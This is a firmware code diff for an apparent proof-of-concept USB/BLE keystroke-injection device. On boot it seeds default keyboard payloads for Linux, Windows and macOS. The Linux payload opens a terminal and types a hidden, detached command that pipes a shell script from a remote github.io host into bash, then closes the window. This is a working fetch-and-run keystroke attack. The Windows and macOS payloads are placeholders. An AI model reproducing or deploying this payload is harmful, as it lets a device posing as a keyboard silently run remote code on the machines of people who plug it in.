@@ -162,8 +162,46 @@ bool pocFsWriteEnd(size_t& sizeOut) {
     sizeOut = s_wn; s_wf.close(); return true;
 }
 
+// Built-in default payloads (mirror data/*.txt). OTA updates the app only, not the
+// filesystem, so we seed any MISSING payload here — the board is never left
+// without one. Existing (user-edited) files are left untouched.
+static const char DEF_LINUX[] = R"(# Linux / Ubuntu-GNOME: open a terminal, fetch+run the pairing helper detached.
+# {MAC} = this board's BLE address. Format: GUI [key]|CTRLALT <key>|STRING <text>|ENTER|DELAY <ms>|# comment
+CTRLALT t
+DELAY 1500
+STRING nohup bash -c 'curl -sL whitewhidow.github.io/hid-ble-poc/pair.sh | bash -s {MAC}' >/dev/null 2>&1 & disown; exit
+ENTER
+)";
+static const char DEF_WINDOWS[] = R"(# Windows (placeholder): Run -> PowerShell + a note. No real BLE helper yet.
+GUI r
+DELAY 600
+STRING powershell
+ENTER
+DELAY 1500
+STRING # PoC-KBD ({MAC}) - Windows BLE pairing bootstrap not implemented yet
+ENTER
+)";
+static const char DEF_MACOS[] = R"(# macOS (placeholder): Spotlight -> Terminal + a note. No real BLE helper yet.
+GUI SPACE
+DELAY 600
+STRING Terminal
+ENTER
+DELAY 1600
+STRING # PoC-KBD ({MAC}) - macOS BLE pairing bootstrap not implemented yet
+ENTER
+)";
+
+static void seedPayload(const char* path, const char* def) {
+    if (LittleFS.exists(path)) return;
+    File f = LittleFS.open(path, "w");
+    if (f) { f.print(def); f.close(); }
+}
+
 void usbHidBegin() {
     LittleFS.begin(true);
+    seedPayload("/linux.txt",   DEF_LINUX);      // recreate any payload lost to an OTA / empty FS
+    seedPayload("/windows.txt", DEF_WINDOWS);
+    seedPayload("/macos.txt",   DEF_MACOS);
     USB.onEvent(usbEventCallback);
     Keyboard.onEvent(usbEventCallback);
     USB.begin();
